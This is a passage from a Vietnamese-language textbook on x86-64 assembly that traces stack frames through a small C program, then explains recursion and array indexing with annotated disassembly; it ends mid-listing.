<p>Sáu tham số đầu tiên của hàm lần lượt được nạp vào các thanh ghi <code>%rdi</code>, <code>%rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, và <code>%r9</code>. Bất kỳ tham số bổ sung nào sẽ được nạp lần lượt vào call stack dựa trên kích thước của chúng (dịch 4 byte cho dữ liệu 32-bit, dịch 8 byte cho dữ liệu 64-bit).</p>
<h3 id="752-tracing-through-an-example"><a class="header" href="#752-tracing-through-an-example">7.5.2. Tracing Through an Example</a></h3>
<p>Dựa trên kiến thức về quản lý hàm, hãy lần theo ví dụ mã nguồn đã được giới thiệu ở đầu chương này. Lưu ý rằng từ khóa <code>void</code> được thêm vào danh sách tham số của mỗi định nghĩa hàm để chỉ rõ rằng các hàm này không nhận đối số nào. Thay đổi này không làm thay đổi kết quả của chương trình; tuy nhiên, nó giúp đơn giản hóa code assembly tương ứng.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int assign(void) {
    int y = 40;
    return y;
}

int adder(void) {
    int a;
    return a + 2;
}

int main(void) {
    int x;
    assign();
    x = adder();
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Chúng ta biên dịch đoạn code này với lệnh:</p>
<pre><code>gcc -o prog prog.c
</code></pre>
<p>và sử dụng:</p>
<pre><code>objdump -d
</code></pre>
<p>để xem code assembly bên dưới. Lệnh thứ hai sẽ xuất ra một tệp khá lớn chứa nhiều thông tin không cần thiết. Hãy dùng <code>less</code> và chức năng tìm kiếm để trích xuất các hàm <code>adder</code>, <code>assign</code> và <code>main</code>:</p>
<pre><code class="language-assembly">0000000000400526 &lt;assign&gt;:
  400526:       55                      push   %rbp
  400527:       48 89 e5                mov    %rsp,%rbp
  40052a:       c7 45 fc 28 00 00 00    movl   $0x28,-0x4(%rbp)
  400531:       8b 45 fc                mov    -0x4(%rbp),%eax
  400534:       5d                      pop    %rbp
  400535:       c3                      retq

0000000000400536 &lt;adder&gt;:
  400536:       55                      push   %rbp
  400537:       48 89 e5                mov    %rsp,%rbp
  40053a:       8b 45 fc                mov    -0x4(%rbp),%eax
  40053d:       83 c0 02                add    $0x2,%eax
  400540:       5d                      pop    %rbp
  400541:       c3                      retq

0000000000400542 &lt;main&gt;:
  400542:       55                      push   %rbp
  400543:       48 89 e5                mov    %rsp,%rbp
  400546:       48 83 ec 10             sub    $0x10,%rsp
  40054a:       e8 e3 ff ff ff          callq  400526 &lt;assign&gt;
  40054f:       e8 d2 ff ff ff          callq  400536 &lt;adder&gt;
  400554:       89 45 fc                mov    %eax,-0x4(%rbp)
  400557:       8b 45 fc                mov    -0x4(%rbp),%eax
  40055a:       89 c6                   mov    %eax,%esi
  40055c:       bf 04 06 40 00          mov    $0x400604,%edi
  400561:       b8 00 00 00 00          mov    $0x0,%eax
  400566:       e8 95 fe ff ff          callq  400400 &lt;printf@plt&gt;
  40056b:       b8 00 00 00 00          mov    $0x0,%eax
  400570:       c9                      leaveq
  400571:       c3                      retq
</code></pre>
<p>Mỗi hàm bắt đầu bằng một <strong>symbolic label</strong> (nhãn ký hiệu) tương ứng với tên được khai báo của nó trong chương trình. Ví dụ, <code>&lt;main&gt;:</code> là symbolic label cho hàm <code>main</code>. Địa chỉ của một nhãn hàm cũng chính là địa chỉ của lệnh đầu tiên trong hàm đó. Để tiết kiệm không gian trong các hình minh họa bên dưới, chúng ta rút gọn địa chỉ xuống 12 bit thấp. Vì vậy, địa chỉ chương trình <code>0x400542</code> sẽ được hiển thị thành <code>0x542</code>.</p>
<h3 id="753-tracing-through-main"><a class="header" href="#753-tracing-through-main">7.5.3. Tracing Through main</a></h3>
<p><strong>Hình 3</strong> cho thấy execution stack ngay trước khi thực thi <code>main</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide1.png" alt="slide1" /></p>
<p><strong>Hình 3.</strong> Trạng thái ban đầu của các thanh ghi CPU và call stack trước khi thực thi hàm <code>main</code></p>
<p>Hãy nhớ rằng stack phát triển về phía các địa chỉ thấp hơn. Trong ví dụ này, <code>%rbp</code> ban đầu là địa chỉ stack <code>0x830</code>, và <code>%rsp</code> ban đầu là địa chỉ stack <code>0xd48</code>. Cả hai giá trị này được giả định cho ví dụ.</p>
<p>Vì các hàm trong ví dụ trước sử dụng dữ liệu kiểu số nguyên, chúng ta làm nổi bật các <strong>component register</strong> <code>%eax</code> và <code>%edi</code>, vốn ban đầu chứa giá trị rác. Mũi tên đỏ (góc trên bên trái) biểu thị lệnh đang được thực thi. Ban đầu, <code>%rip</code> chứa địa chỉ <code>0x542</code>, là địa chỉ trong bộ nhớ chương trình của dòng đầu tiên trong hàm <code>main</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide2.png" alt="slide2" /></p>
<p>Lệnh đầu tiên lưu giá trị hiện tại của <code>%rbp</code> bằng cách <strong>push</strong> <code>0x830</code> lên stack. Vì stack phát triển về phía địa chỉ thấp hơn, stack pointer <code>%rsp</code> được cập nhật thành <code>0xd40</code>, tức nhỏ hơn <code>0xd48</code> 8 byte. <code>%rip</code> tăng tới lệnh tiếp theo.</p>
<p><img src="C7-x86_64/_images/procedures/Slide3.png" alt="slide3" /></p>
<p>Lệnh tiếp theo (<code>mov %rsp, %rbp</code>) cập nhật giá trị <code>%rbp</code> thành bằng <code>%rsp</code>. Frame pointer (<code>%rbp</code>) giờ trỏ tới đầu stack frame của hàm <code>main</code>. <code>%rip</code> tăng tới lệnh tiếp theo.</p>
<p><img src="C7-x86_64/_images/procedures/Slide4.png" alt="slide4" /></p>
<p>Lệnh <code>sub</code> trừ <code>0x10</code> khỏi địa chỉ của stack pointer, về cơ bản làm stack “mở rộng” thêm 16 byte, được biểu diễn bằng hai ô nhớ 8 byte trên stack. <code>%rsp</code> giờ có giá trị mới là <code>0xd30</code>. <code>%rip</code> tăng tới lệnh tiếp theo.</p>
<p><img src="C7-x86_64/_images/procedures/Slide5.png" alt="slide5" /></p>
<p>Lệnh <code>callq &lt;assign&gt;</code> <strong>push</strong> giá trị trong <code>%rip</code> (địa chỉ của lệnh <em>tiếp theo</em> sẽ thực thi) lên stack. Vì lệnh tiếp theo sau <code>callq &lt;assign&gt;</code> có địa chỉ <code>0x55f</code>, giá trị này được push lên stack làm <strong>return address</strong>. Hãy nhớ rằng return address cho biết địa chỉ chương trình sẽ tiếp tục thực thi khi quay lại <code>main</code>.</p>
<p>Tiếp đó, lệnh <code>callq</code> đưa địa chỉ của hàm <code>assign</code> (<code>0x526</code>) vào <code>%rip</code>, báo hiệu chương trình sẽ tiếp tục thực thi trong hàm callee <code>assign</code> thay vì lệnh tiếp theo trong <code>main</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide6.png" alt="slide6" /></p>
<p>Hai lệnh đầu tiên trong hàm <code>assign</code> là phần “dọn dẹp sổ sách” (book-keeping) mà mọi hàm đều thực hiện. Lệnh đầu tiên <strong>push</strong> giá trị trong <code>%rbp</code> (địa chỉ <code>0xd40</code>) lên stack. Hãy nhớ rằng địa chỉ này trỏ tới đầu stack frame của <code>main</code>. <code>%rip</code> tăng tới lệnh thứ hai trong <code>assign</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide7.png" alt="slide7" /></p>
<p>Lệnh tiếp theo (<code>mov %rsp, %rbp</code>) cập nhật <code>%rbp</code> để trỏ tới đỉnh stack, đánh dấu đầu stack frame của <code>assign</code>. <code>%rip</code> tăng tới lệnh tiếp theo trong <code>assign</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide8.png" alt="slide8" /></p>
<p>Lệnh <code>mov</code> tại địa chỉ <code>0x52a</code> đưa giá trị <code>$0x28</code> (tức 40) vào stack tại địa chỉ <code>-0x4(%rbp)</code>, tức 4 byte phía trên frame pointer. Frame pointer thường được dùng để tham chiếu các vị trí trên stack. Lưu ý rằng thao tác này <strong>không</strong> thay đổi <code>%rsp</code> — stack pointer vẫn trỏ tới <code>0xd20</code>. <code>%rip</code> tăng tới lệnh tiếp theo trong <code>assign</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide9.png" alt="slide9" /></p>
<p>Lệnh <code>mov</code> tại địa chỉ <code>0x531</code> đưa giá trị <code>$0x28</code> vào <code>%eax</code>, thanh ghi chứa giá trị trả về của hàm. <code>%rip</code> tăng tới lệnh <code>pop</code> trong <code>assign</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide10.png" alt="slide10" /></p>
<p>Lúc này, hàm <code>assign</code> gần như đã hoàn tất. Lệnh tiếp theo là <code>pop %rbp</code>, khôi phục <code>%rbp</code> về giá trị trước đó (<code>0xd40</code>). Vì <code>pop</code> thay đổi stack pointer, <code>%rsp</code> được cập nhật thành <code>0xd28</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide11.png" alt="slide11" /></p>
<p>Lệnh cuối cùng trong <code>assign</code> là <code>retq</code>. Khi <code>retq</code> thực thi, return address được <strong>pop</strong> khỏi stack vào <code>%rip</code>. Trong ví dụ này, <code>%rip</code> giờ trỏ tới lệnh <code>callq</code> trong <code>main</code> tại địa chỉ <code>0x55f</code>.</p>
<p>Một số điểm quan trọng cần lưu ý:</p>
<ul>
<li>Stack pointer và frame pointer đã được khôi phục về giá trị trước khi gọi <code>assign</code>, cho thấy stack frame của <code>main</code> lại trở thành active frame.</li>
<li>Các giá trị cũ trên stack từ stack frame trước <strong>không</strong> bị xóa. Chúng vẫn tồn tại trên call stack.</li>
</ul>
<p><img src="C7-x86_64/_images/procedures/Slide12.png" alt="slide12" /></p>
<p>Quay lại <code>main</code>, lệnh gọi <code>adder</code> <strong>ghi đè</strong> return address cũ trên stack bằng return address mới (<code>0x554</code>). Return address này trỏ tới lệnh sẽ thực thi sau khi <code>adder</code> trả về, tức <code>mov %eax, -0x4(%rbp)</code>. <code>%rip</code> được cập nhật trỏ tới lệnh đầu tiên trong <code>adder</code> tại địa chỉ <code>0x536</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide13.png" alt="slide13" /></p>
<p>Lệnh đầu tiên trong <code>adder</code> lưu frame pointer của caller (<code>%rbp</code> của <code>main</code>) lên stack.</p>
<p><img src="C7-x86_64/_images/procedures/Slide14.png" alt="slide14" /></p>
<p>Lệnh tiếp theo cập nhật <code>%rbp</code> bằng giá trị hiện tại của <code>%rsp</code> (<code>0xd20</code>). Hai lệnh này thiết lập đầu stack frame cho <code>adder</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide15.png" alt="slide15" /></p>
<p>Hãy chú ý tới lệnh tiếp theo. Hãy nhớ rằng <code>$0x28</code> đã được đặt trên stack khi gọi <code>assign</code>. Lệnh <code>mov $-0x4(%rbp), %eax</code> di chuyển <strong>giá trị cũ</strong> trên stack vào <code>%eax</code>! Điều này sẽ không xảy ra nếu lập trình viên đã khởi tạo biến <code>a</code> trong <code>adder</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide16.png" alt="slide16" /></p>
<p>Lệnh <code>add</code> tại địa chỉ <code>0x53d</code> cộng 2 vào <code>%eax</code>. Hãy nhớ rằng khi trả về một số nguyên 32-bit, x86-64 sử dụng <code>%eax</code> thay vì <code>%rax</code>. Hai lệnh cuối này tương đương với đoạn code trong <code>adder</code>:</p>
<pre><code class="language-c">int a;
return a + 2;
</code></pre>
<p><img src="C7-x86_64/_images/procedures/Slide17.png" alt="slide20" /></p>
<p>Sau khi <code>pop</code> thực thi, frame pointer lại trỏ tới đầu stack frame của <code>main</code> (<code>0xd40</code>). Stack pointer lúc này chứa địa chỉ <code>0xd28</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide18.png" alt="slide18" /></p>
<p>Việc thực thi lệnh <code>retq</code> sẽ <strong>pop</strong> địa chỉ trả về (return address) ra khỏi stack, khôi phục <strong>instruction pointer</strong> về <code>0x554</code>, tức địa chỉ của lệnh tiếp theo sẽ được thực thi trong <code>main</code>. Địa chỉ chứa trong <code>%rsp</code> lúc này là <code>0xd30</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide19.png" alt="slide19" /></p>
<p>Quay lại <code>main</code>, lệnh <code>mov %eax, -0x4(%rbp)</code> đặt giá trị trong <code>%eax</code> vào vị trí bộ nhớ cách <code>%rbp</code> 4 byte, tức địa chỉ <code>0xd3c</code>. Lệnh tiếp theo lại đưa giá trị này trở lại vào thanh ghi <code>%eax</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide21.png" alt="slide21" /></p>
<p>Bỏ qua một vài bước, lệnh <code>mov</code> tại địa chỉ <code>0x55a</code> sao chép giá trị trong <code>%eax</code> (tức <code>0x2A</code>) vào thanh ghi <code>%esi</code>, là <strong>component register</strong> 32-bit của <code>%rsi</code> và thường lưu tham số thứ hai của một hàm.</p>
<p><img src="C7-x86_64/_images/procedures/Slide22.png" alt="slide22" /></p>
<p>Lệnh tiếp theo (<code>mov $0x400604, %edi</code>) sao chép một giá trị hằng (một địa chỉ trong <strong>code segment memory</strong>) vào thanh ghi <code>%edi</code>. Hãy nhớ rằng <code>%edi</code> là <strong>component register</strong> 32-bit của <code>%rdi</code>, thường lưu tham số thứ nhất của một hàm. Địa chỉ <code>0x400604</code> trong code segment là địa chỉ bắt đầu của chuỗi <code>&quot;x is %d\n&quot;</code>.</p>
<p><img src="C7-x86_64/_images/procedures/Slide23.png" alt="slide23" /></p>
<p>Lệnh tiếp theo đặt lại giá trị của <code>%eax</code> thành 0. Instruction pointer lúc này trỏ tới lời gọi hàm <code>printf</code> (được ký hiệu là <code>&lt;printf@plt&gt;</code>).</p>
<p><img src="C7-x86_64/_images/procedures/Slide24.png" alt="slide24" /></p>
<p>Lệnh tiếp theo gọi hàm <code>printf</code>. Để ngắn gọn, chúng ta sẽ không lần theo chi tiết hàm <code>printf</code> (thuộc <code>stdio.h</code>). Tuy nhiên, theo trang hướng dẫn (<code>man -s3 printf</code>), <code>printf</code> có dạng:</p>
<pre><code>int printf(const char * format, ...)
</code></pre>
<p>Nói cách khác, tham số đầu tiên là con trỏ tới chuỗi định dạng, và các tham số tiếp theo là các giá trị sẽ được chèn vào định dạng đó. Các lệnh từ địa chỉ <code>0x55a</code> đến <code>0x566</code> tương ứng với dòng lệnh trong hàm <code>main</code>:</p>
<pre><code class="language-c">printf(&quot;x is %d\n&quot;, x);
</code></pre>
<p>Khi hàm <code>printf</code> được gọi:</p>
<ul>
<li>Một <strong>return address</strong> chỉ lệnh sẽ thực thi sau khi <code>printf</code> kết thúc được <strong>push</strong> lên stack.</li>
<li>Giá trị của <code>%rbp</code> được <strong>push</strong> lên stack, và <code>%rbp</code> được cập nhật để trỏ tới đỉnh stack, đánh dấu bắt đầu stack frame của <code>printf</code>.</li>
</ul>
<p>Tại một thời điểm nào đó, <code>printf</code> sẽ tham chiếu tới các đối số của nó: chuỗi <code>&quot;x is %d\n&quot;</code> và giá trị <code>0x2A</code>. Tham số thứ nhất được lưu trong <code>%edi</code>, tham số thứ hai được lưu trong <code>%esi</code>. Return address nằm ngay bên dưới <code>%rbp</code> tại vị trí <code>%rbp+8</code>.</p>
<p>Với bất kỳ hàm nào có <em>n</em> tham số, GCC sẽ đặt 6 tham số đầu tiên vào các thanh ghi (như trong Bảng 2), và các tham số còn lại sẽ được đặt trên stack <em>bên dưới</em> return address.</p>
<p>Sau khi gọi <code>printf</code>, giá trị <code>0x2A</code> sẽ được in ra cho người dùng ở dạng số nguyên. Do đó, giá trị <strong>42</strong> được in ra màn hình.</p>
<p><img src="C7-x86_64/_images/procedures/Slide25.png" alt="slide25" /></p>
<p>Sau khi gọi <code>printf</code>, một vài lệnh cuối sẽ dọn dẹp stack và chuẩn bị thoát sạch sẽ khỏi hàm <code>main</code>. Đầu tiên, lệnh <code>mov</code> tại địa chỉ <code>0x56b</code> đảm bảo rằng giá trị 0 nằm trong thanh ghi trả về (vì việc cuối cùng <code>main</code> làm là <code>return 0</code>).</p>
<p><img src="C7-x86_64/_images/procedures/Slide26.png" alt="slide26" /></p>
<p>Lệnh <code>leaveq</code> chuẩn bị stack để trả về từ lời gọi hàm. Hãy nhớ rằng <code>leaveq</code> tương đương với cặp lệnh:</p>
<pre><code>mov %rbp, %rsp
pop %rbp
</code></pre>
<p>Nói cách khác, CPU ghi đè stack pointer bằng frame pointer. Trong ví dụ này, stack pointer được cập nhật từ <code>0xd30</code> thành <code>0xd40</code>. Tiếp đó, CPU thực thi <code>pop %rbp</code>, lấy giá trị tại <code>0xd40</code> (trong ví dụ này là địa chỉ <code>0x830</code>) và đặt vào <code>%rbp</code>. Sau khi <code>leaveq</code> thực thi, stack pointer và frame pointer trở lại giá trị ban đầu trước khi <code>main</code> chạy.</p>
<p>Lệnh cuối cùng được thực thi là <code>retq</code>. Với giá trị <code>0x0</code> trong thanh ghi trả về <code>%eax</code>, chương trình trả về 0, báo hiệu kết thúc thành công.</p>
<p>Nếu bạn đã đọc kỹ phần này, bạn sẽ hiểu vì sao chương trình in ra giá trị <strong>42</strong>. Về bản chất, chương trình đã vô tình sử dụng các giá trị cũ trên stack, khiến nó hoạt động theo cách mà ta không ngờ tới. Ví dụ này khá vô hại; tuy nhiên, ở các phần sau, chúng ta sẽ thảo luận cách tin tặc lợi dụng lời gọi hàm để khiến chương trình hoạt động sai lệch theo những cách thực sự nguy hiểm.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="76-Đệ-quy-recursion"><a class="header" href="#76-Đệ-quy-recursion">7.6. Đệ quy (Recursion)</a></h2>
<p><strong>Hàm đệ quy</strong> là một lớp đặc biệt của hàm, trong đó hàm tự gọi lại chính nó (còn gọi là <strong>self-referential function</strong>) để tính toán một giá trị. Giống như các hàm không đệ quy, hàm đệ quy tạo ra <strong>stack frame</strong> mới cho mỗi lần gọi hàm. Khác với hàm thông thường, hàm đệ quy chứa lời gọi hàm tới chính nó.</p>
<p>Hãy cùng quay lại bài toán tính tổng các số nguyên dương từ <em>1</em> đến <em>n</em>. Ở các phần trước, chúng ta đã thảo luận về hàm <code>sumUp</code> để thực hiện nhiệm vụ này. <strong>Bảng 1</strong> dưới đây cho thấy một hàm liên quan có tên <code>sumDown</code> (cộng các số theo thứ tự ngược từ <em>n</em> về <em>1</em>) và phiên bản đệ quy tương đương <code>sumr</code>:</p>
<h4 id="phiên-bản-lặp-sumdown"><a class="header" href="#phiên-bản-lặp-sumdown">Phiên bản lặp (<code>sumDown</code>)</a></h4>
<pre><code class="language-c">int sumDown(int n) {
    int total = 0;
    int i = n;
    while (i &gt; 0) {
        total += i;
        i--;
    }
    return total;
}
</code></pre>
<h4 id="phiên-bản-đệ-quy-sumr"><a class="header" href="#phiên-bản-đệ-quy-sumr">Phiên bản đệ quy (<code>sumr</code>)</a></h4>
<pre><code class="language-c">int sumr(int n) {
    if (n &lt;= 0) {
        return 0;
    }
    return n + sumr(n-1);
}
</code></pre>
<p><strong>Bảng 1.</strong> Phiên bản lặp (sumDown) và phiên bản đệ quy (sumr)</p>
<p><strong>Base case</strong> (trường hợp cơ sở) trong hàm đệ quy <code>sumr</code> xử lý mọi giá trị <em>n</em> nhỏ hơn 1. <strong>Bước đệ quy</strong> gọi <code>sumr</code> với giá trị <em>n-1</em> và cộng kết quả với <em>n</em> trước khi trả về. Khi biên dịch <code>sumr</code> và dùng GDB để disassemble, ta thu được code assembly sau:</p>
<pre><code>Dump of assembler code for function sumr:
0x400551 &lt;+0&gt;:    push  %rbp               # lưu %rbp
0x400552 &lt;+1&gt;:    mov   %rsp,%rbp          # cập nhật %rbp (stack frame mới)
0x400555 &lt;+4&gt;:    sub   $0x10,%rsp         # mở rộng stack frame thêm 16 byte
0x400559 &lt;+8&gt;:    mov   %edi,-0x4(%rbp)    # đưa tham số n vào %rbp-0x4
0x40055c &lt;+11&gt;:   cmp   $0x0,-0x4(%rbp)    # so sánh n với 0
0x400560 &lt;+15&gt;:   jg    0x400569 &lt;sumr+24&gt; # nếu (n &gt; 0) goto &lt;sumr+24&gt; [body]
0x400562 &lt;+17&gt;:   mov   $0x0,%eax          # copy 0 vào %eax
0x400567 &lt;+22&gt;:   jmp   0x40057d &lt;sumr+44&gt; # goto &lt;sumr+44&gt; [done]
0x400569 &lt;+24&gt;:   mov   -0x4(%rbp),%eax    # copy n vào %eax (result = n)
0x40056c &lt;+27&gt;:   sub   $0x1,%eax          # trừ 1 khỏi %eax (result -= 1)
0x40056f &lt;+30&gt;:   mov   %eax,%edi          # copy %eax vào %edi
0x400571 &lt;+32&gt;:   callq 0x400551 &lt;sumr&gt;    # gọi sumr(result)
0x400576 &lt;+37&gt;:   mov   %eax,%edx          # copy giá trị trả về vào %edx
0x400578 &lt;+39&gt;:   mov   -0x4(%rbp),%eax    # copy n vào %eax
0x40057b &lt;+42&gt;:   add   %edx,%eax          # cộng sumr(result) vào n
0x40057d &lt;+44&gt;:   leaveq                   # chuẩn bị thoát hàm
0x40057e &lt;+45&gt;:   retq                     # trả về kết quả
</code></pre>
<p>Mỗi dòng trong đoạn assembly trên đều đã được chú thích bằng tiếng Việt. <strong>Bảng 2</strong> dưới đây cho thấy dạng <code>goto</code> tương ứng và phiên bản C không dùng <code>goto</code>:</p>
<h4 id="phiên-bản-c-dùng-goto"><a class="header" href="#phiên-bản-c-dùng-goto">Phiên bản C dùng <code>goto</code></a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &gt; 0) {
        goto body;
    }
    result = 0;
    goto done;
body:
    result = n;
    result -= 1;
    result = sumr(result);
    result += n;
done:
    return result;
}
</code></pre>
<h4 id="phiên-bản-c-không-dùng-goto"><a class="header" href="#phiên-bản-c-không-dùng-goto">Phiên bản C không dùng <code>goto</code></a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &lt;= 0) {
        return 0;
    }
    result = sumr(n-1);
    result += n;
    return result;
}
</code></pre>
<p><strong>Bảng 2.</strong> Dạng C dùng <code>goto</code> và bản dịch code assembly của <code>sumr</code></p>
<p>Mặc dù bản dịch này ban đầu có thể trông không giống hệt hàm <code>sumr</code> gốc, nhưng khi xem xét kỹ, ta thấy hai hàm này thực sự tương đương.</p>
<h3 id="761-hoạt-hình-quan-sát-sự-thay-đổi-của-call-stack"><a class="header" href="#761-hoạt-hình-quan-sát-sự-thay-đổi-của-call-stack">7.6.1. Hoạt hình: Quan sát sự thay đổi của Call Stack</a></h3>
<p>Như một bài tập, bạn nên thử vẽ lại stack và quan sát cách các giá trị thay đổi. Hình động dưới đây minh họa cách stack được cập nhật khi chúng ta chạy hàm này với giá trị 3.</p>
<p><img src="C7-x86_64/_images/recursion.gif" alt="recursion" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="77-mảng-arrays"><a class="header" href="#77-mảng-arrays">7.7. Mảng (Arrays)</a></h2>
<p>Hãy nhớ rằng <a href="C7-x86_64/../C1-C_intro/arrays_strings.html#_introduction_to_arrays">arrays</a> (mảng) là tập hợp có thứ tự của các phần tử dữ liệu cùng kiểu, được lưu trữ liên tiếp trong bộ nhớ. Các <a href="C7-x86_64/../C2-C_depth/arrays.html#_single_dimensional_arrays">single-dimension arrays</a> (mảng một chiều) được cấp phát tĩnh có dạng <code>Type arr[N]</code>, trong đó <code>Type</code> là kiểu dữ liệu, <code>arr</code> là tên định danh của mảng, và <code>N</code> là số phần tử dữ liệu. Khai báo mảng tĩnh như <code>Type arr[N]</code> hoặc cấp phát động như <code>arr = malloc(N * sizeof(Type))</code> sẽ chiếm tổng cộng <em>N</em> × sizeof(<em>Type</em>) byte bộ nhớ.</p>
<p>Để truy cập phần tử tại chỉ số <em>i</em> trong mảng <code>arr</code>, sử dụng cú pháp <code>arr[i]</code>. <strong>Compiler</strong> thường chuyển đổi các truy cập mảng thành <a href="C7-x86_64/../C2-C_depth/pointers.html#_pointer_variables">pointer arithmetic</a> (tính toán con trỏ) trước khi dịch sang assembly. Do đó, <code>arr + i</code> tương đương với <code>&amp;arr[i]</code>, và <code>*(arr + i)</code> tương đương với <code>arr[i]</code>. Vì mỗi phần tử trong <code>arr</code> có kiểu <code>Type</code>, nên <code>arr + i</code> ngụ ý rằng phần tử <em>i</em> được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>.</p>
<p><strong>Bảng 1</strong> dưới đây tóm tắt một số thao tác mảng phổ biến và lệnh assembly tương ứng. Trong các ví dụ sau, giả sử ta khai báo một mảng <code>int</code> có độ dài 10 (<code>int arr[10]</code>). Giả sử thanh ghi <code>%rdx</code> lưu địa chỉ của <code>arr</code>, thanh ghi <code>%rcx</code> lưu giá trị <code>int</code> là <code>i</code>, và thanh ghi <code>%rax</code> biểu diễn một biến <code>x</code> (cũng có kiểu <code>int</code>). Hãy nhớ rằng biến <code>int</code> chiếm 4 byte, trong khi biến <code>int *</code> chiếm 8 byte.</p>
<div class="table-wrapper"><table><thead><tr><th>Operation</th><th>Type</th><th>Assembly Representation</th></tr></thead><tbody>
<tr><td><code>x = arr</code></td><td><code>int *</code></td><td><code>mov %rdx, %rax</code></td></tr>
<tr><td><code>x = arr[0]</code></td><td><code>int</code></td><td><code>mov (%rdx), %eax</code></td></tr>
<tr><td><code>x = arr[i]</code></td><td><code>int</code></td><td><code>mov (%rdx, %rcx,4), %eax</code></td></tr>
<tr><td><code>x = &amp;arr[3]</code></td><td><code>int *</code></td><td><code>lea 0xc(%rdx), %rax</code></td></tr>
<tr><td><code>x = arr+3</code></td><td><code>int *</code></td><td><code>lea 0xc(%rdx), %rax</code></td></tr>
<tr><td><code>x = *(arr+5)</code></td><td><code>int</code></td><td><code>mov 0x14(%rdx), %eax</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thao tác mảng phổ biến và lệnh assembly tương ứng.</p>
<p>Hãy chú ý đến <em>type</em> (kiểu dữ liệu) của từng biểu thức trong <a href="C7-x86_64/arrays.html#ArrayOps">Bảng 1</a>. Nói chung, compiler sử dụng lệnh <code>mov</code> để <strong>dereference</strong> (giải tham chiếu) con trỏ và lệnh <code>lea</code> để tính toán địa chỉ.</p>
<p>Lưu ý rằng để truy cập phần tử <code>arr[3]</code> (hoặc <code>*(arr+3)</code> khi dùng pointer arithmetic), compiler thực hiện truy xuất bộ nhớ tại địa chỉ <code>arr + 3*4</code> thay vì <code>arr + 3</code>. Để hiểu tại sao, hãy nhớ rằng bất kỳ phần tử nào tại chỉ số <em>i</em> trong mảng được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>. Do đó, compiler phải nhân chỉ số với kích thước của kiểu dữ liệu (trong trường hợp này là 4, vì <code>sizeof(int) = 4</code>) để tính toán đúng <strong>offset</strong> (độ lệch). Cũng cần nhớ rằng bộ nhớ được <strong>byte-addressable</strong> (địa chỉ hóa theo byte); việc dịch chuyển đúng số byte tương đương với việc tính toán địa chỉ. Cuối cùng, vì giá trị <code>int</code> chỉ cần 4 byte, nên chúng được lưu trong <strong>component register</strong> <code>%eax</code> của thanh ghi <code>%rax</code>.</p>
<p>Ví dụ, xét một mảng (<code>array</code>) gồm 10 phần tử kiểu <code>int</code> (Hình 1):</p>
<p><img src="C7-x86_64/_images/arrayFig.png" alt="Each integer in the array requires four bytes." /></p>
<p><strong>Hình 1.</strong> Cách bố trí một mảng 10 số nguyên trong bộ nhớ. Mỗi ô được gắn nhãn x~i~ biểu diễn 4 byte.</p>
<p>Vì <code>array</code> là mảng số nguyên, mỗi phần tử chiếm đúng 4 byte. Do đó, một mảng <code>int</code> gồm 10 phần tử chiếm 40 byte bộ nhớ liên tiếp.</p>
<p>Để tính địa chỉ của phần tử thứ 3, compiler nhân chỉ số 3 với kích thước dữ liệu của kiểu <code>int</code> (4) để được offset là 12 (hay 0xc). Quả thật, phần tử thứ 3 trong Hình 1 nằm tại byte offset x~12~.</p>
<p>Hãy xem một hàm C đơn giản <code>sumArray</code> tính tổng tất cả các phần tử trong mảng:</p>
<pre><code class="language-c">int sumArray(int *array, int length) {
    int i, total = 0;
    for (i = 0; i &lt; length; i++) {
        total += array[i];
    }
    return total;
}
</code></pre>
<p>Hàm <code>sumArray</code> nhận địa chỉ của một mảng và độ dài tương ứng, sau đó cộng dồn tất cả các phần tử trong mảng. Bây giờ, hãy xem đoạn code assembly tương ứng của hàm <code>sumArray</code>:</p>
<pre><code>0x400686 &lt;+0&gt;:   push %rbp                   # save %rbp
0x400687 &lt;+1&gt;:    mov  %rsp,%rbp              # update %rbp (new stack frame)
0x40068a &lt;+4&gt;:    mov  %rdi,-0x18(%rbp)       # copy array to %rbp-0x18
0x40068e &lt;+8&gt;:    mov  %esi,-0x1c(%rbp)       # copy length to %rbp-0x1c
0x400691 &lt;+11&gt;:   movl $0x0,-0x4(%rbp)        # copy 0 to %rbp-0x4 (total)
0x400698 &lt;+18&gt;:   movl $0x0,-0x8(%rbp)        # copy 0 to %rbp-0x8 (i)
0x40069f &lt;+25&gt;:   jmp  0x4006be &lt;sumArray+56&gt; # goto &lt;sumArray+56&gt;
0x4006a1 &lt;+27&gt;:   mov  -0x8(%rbp),%eax        # copy i to %eax
0x4006a4 &lt;+30&gt;:   cltq                        # convert i to a 64-bit integer
0x4006a6 &lt;+32&gt;:   lea  0x0(,%rax,4),%rdx      # copy i*4 to %rdx
0x4006ae &lt;+40&gt;:   mov  -0x18(%rbp),%rax       # copy array to %rax
0x4006b2 &lt;+44&gt;:   add  %rdx,%rax              # compute array+i*4, store in %rax
0x4006b5 &lt;+47&gt;:   mov  (%rax),%eax            # copy array[i] to %eax
0x4006b7 &lt;+49&gt;:   add  %eax,-0x4(%rbp)        # add %eax to total
0x4006ba &lt;+52&gt;:   addl $0x1,-0x8(%rbp)        # add 1 to i (i+=1)
0x4006be &lt;+56&gt;:   mov  -0x8(%rbp),%eax        # copy i to %eax
0x4006c1 &lt;+59&gt;:   cmp  -0x1c(%rbp),%eax       # compare i to length
